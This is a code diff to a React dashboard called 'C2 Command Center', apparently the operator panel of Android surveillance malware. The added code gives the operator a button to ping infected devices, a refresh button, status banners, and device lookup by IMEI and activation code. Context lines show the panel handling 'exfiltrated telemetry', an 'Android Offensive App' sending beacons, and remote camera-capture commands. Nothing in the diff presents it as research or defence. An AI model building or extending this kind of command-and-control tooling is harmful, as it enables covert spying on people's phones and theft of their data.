@@ -81,6 +81,10 @@ export default function C2CommandCenterClient({
   const [customCodeLoading, setCustomCodeLoading] = useState<boolean>(false);
   const [copiedCode, setCopiedCode] = useState<string | null>(null);
 
+  const [isRefreshing, setIsRefreshing] = useState<boolean>(false);
+  const [isPinging, setIsPinging] = useState<boolean>(false);
+  const [pingFeedback, setPingFeedback] = useState<{ message: string; type: "success" | "error" } | null>(null);
+
   const [selectedDevice, setSelectedDevice] = useState<string>("ALL");
   const [isConnected, setIsConnected] = useState<boolean>(true);
   const [terminalInput, setTerminalInput] = useState<string>("");
@@ -339,6 +343,49 @@ export default function C2CommandCenterClient({
     handleSetCommand(`script ${script}`);
   };
 
+  const handleManualRefresh = async () => {
+    setIsRefreshing(true);
+    try {
+      await fetchC2Data();
+    } catch (e) {
+      console.error(e);
+    } finally {
+      setTimeout(() => setIsRefreshing(false), 500);
+    }
+  };
+
+  const handlePingDevice = async (target?: string) => {
+    const dev = target || selectedDevice || "ALL";
+    setIsPinging(true);
+    setPingFeedback({ message: `Dispatching Ping to ${dev}...`, type: "success" });
+    try {
+      const res = await fetch("/api/c2", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          action: "ping_device",
+          target_device: dev
+        })
+      });
+      const json = await res.json();
+      if (json.success) {
+        setPingFeedback({ message: `⚡ Ping dispatched to ${dev}! Heartbeat signal registered.`, type: "success" });
+        await fetchC2Data();
+        setTerminalHistory(prev => [
+          { cmd: "ping", time: new Date().toLocaleTimeString(), output: `Ping handshake signal sent to ${dev}` },
+          ...prev
+        ]);
+      } else {
+        setPingFeedback({ message: `Ping failed: ${json.error || "Unable to reach C2"}`, type: "error" });
+      }
+    } catch (err) {
+      setPingFeedback({ message: "Network error sending ping to C2.", type: "error" });
+    } finally {
+      setIsPinging(false);
+      setTimeout(() => setPingFeedback(null), 4000);
+    }
+  };
+
   const handleClearLogs = async () => {
     if (!confirm("Are you sure you want to clear all exfiltrated telemetry and logs?")) return;
     setActionLoading(true);
@@ -498,14 +545,19 @@ export default function C2CommandCenterClient({
 
   const isLowBandwidth = config.low_bandwidth_mode ?? true;
 
-  // Device online check
+  // Device online check (5-minute heartbeat threshold)
   const isDevOnline = (devId: string) => {
-    const d = devices.find((item: any) => item.device_id === devId);
+    const d = devices.find((item: any) => 
+      item.device_id === devId || 
+      item.imei === devId || 
+      `DEV_${item.app_service_id}` === devId ||
+      item.activation_code === devId
+    );
     if (d && typeof d.is_online === "boolean") return d.is_online;
     const dLogs = logs.filter((l: any) => (l.device_id || l.imei) === devId);
     if (dLogs.length === 0) return false;
     const latest = new Date(dLogs[0].timestamp || dLogs[0].created_at).getTime();
-    return (Date.now() - latest) < 120000;
+    return (Date.now() - latest) < 300000;
   };
 
   const onlineDevList = activeDevices.filter(id => isDevOnline(id));
@@ -579,7 +631,29 @@ export default function C2CommandCenterClient({
           </div>
 
           {/* Target Selector & Low-Bandwidth Mode Indicator */}
-          <div className="flex items-center gap-2.5 flex-wrap">
+          <div className="flex items-center gap-2 flex-wrap">
+            {/* PING TARGET / BROADCAST BUTTON */}
+            <button
+              onClick={() => handlePingDevice(selectedDevice)}
+              disabled={isPinging}
+              className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-700 hover:from-emerald-500 hover:to-teal-500 text-white rounded-2xl text-xs font-black flex items-center gap-1.5 shadow-lg shadow-emerald-950/60 cursor-pointer disabled:opacity-50 transition-all active:scale-95 border border-emerald-400/40"
+              title="Dispatch instant ping sync packet to target device"
+            >
+              <Radio size={14} className={cn("text-emerald-200", isPinging && "animate-ping")} />
+              <span>{isPinging ? "Pinging..." : selectedDevice === "ALL" ? "⚡ Ping All" : "⚡ Ping Target"}</span>
+            </button>
+
+            {/* MANUAL REFRESH BUTTON */}
+            <button
+              onClick={handleManualRefresh}
+              disabled={isRefreshing}
+              className="px-3 py-1.5 bg-slate-900 border border-slate-750 hover:bg-slate-800 text-slate-200 rounded-2xl text-xs font-bold flex items-center gap-1.5 cursor-pointer disabled:opacity-50 transition-all shadow-sm"
+              title="Refresh C2 telemetry & online status"
+            >
+              <RefreshCw size={13} className={cn("text-blue-400", isRefreshing && "animate-spin")} />
+              <span>{isRefreshing ? "Refreshing..." : "Refresh"}</span>
+            </button>
+
             <button
               onClick={() => handleToggleConfig("low_bandwidth_mode", !isLowBandwidth)}
               className={cn(
@@ -590,10 +664,10 @@ export default function C2CommandCenterClient({
               )}
             >
               <Zap size={14} className={isLowBandwidth ? "text-amber-400" : "text-blue-400"} />
-              <span>{isLowBandwidth ? "2G/3G Low-Data Mode" : "HD Mode"}</span>
+              <span>{isLowBandwidth ? "2G/3G Low-Data" : "HD Mode"}</span>
             </button>
 
-            <div className="flex items-center gap-2 bg-slate-900/90 border border-slate-700 p-1.5 rounded-2xl">
+            <div className="flex items-center gap-2 bg-slate-900/90 border border-slate-750 p-1.5 rounded-2xl">
               <Filter size={14} className="text-blue-400 ml-1.5" />
               <select
                 value={selectedDevice}
@@ -621,6 +695,22 @@ export default function C2CommandCenterClient({
             </button>
           </div>
         </div>
+
+        {/* PING STATUS BANNER / FEEDBACK */}
+        {pingFeedback && (
+          <div className={cn(
+            "relative z-10 mt-3 px-4 py-2.5 rounded-2xl text-xs font-bold flex items-center justify-between gap-2 shadow-lg animate-in fade-in slide-in-from-top-1",
+            pingFeedback.type === "success" 
+              ? "bg-emerald-950/80 border border-emerald-500/50 text-emerald-300" 
+              : "bg-rose-950/80 border border-rose-500/50 text-rose-300"
+          )}>
+            <div className="flex items-center gap-2">
+              <Radio size={14} className={pingFeedback.type === "success" ? "animate-ping text-emerald-400" : "text-rose-400"} />
+              <span>{pingFeedback.message}</span>
+            </div>
+            <button onClick={() => setPingFeedback(null)} className="text-slate-400 hover:text-white text-xs cursor-pointer">✕</button>
+          </div>
+        )}
       </div>
 
       {/* ============================================================ */}
@@ -834,7 +924,15 @@ export default function C2CommandCenterClient({
                             : "No Android target is currently broadcasting beacons. Run the Android Offensive App or start the background service to establish live telemetry."}
                         </p>
                       </div>
-                      <div className="flex items-center justify-center gap-3 pt-2">
+                      <div className="flex items-center justify-center gap-2.5 pt-2 flex-wrap">
+                        <button
+                          onClick={() => handlePingDevice(selectedDevice)}
+                          disabled={isPinging}
+                          className="px-3.5 py-2 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-1.5 shadow cursor-pointer disabled:opacity-50"
+                        >
+                          <Radio size={14} className={isPinging ? "animate-ping" : ""} />
+                          {isPinging ? "Pinging Target..." : "⚡ Ping & Check Status"}
+                        </button>
                         <button
                           onClick={() => handleSetCommand("capture_camera_low")}
                           disabled={onlineCount === 0}
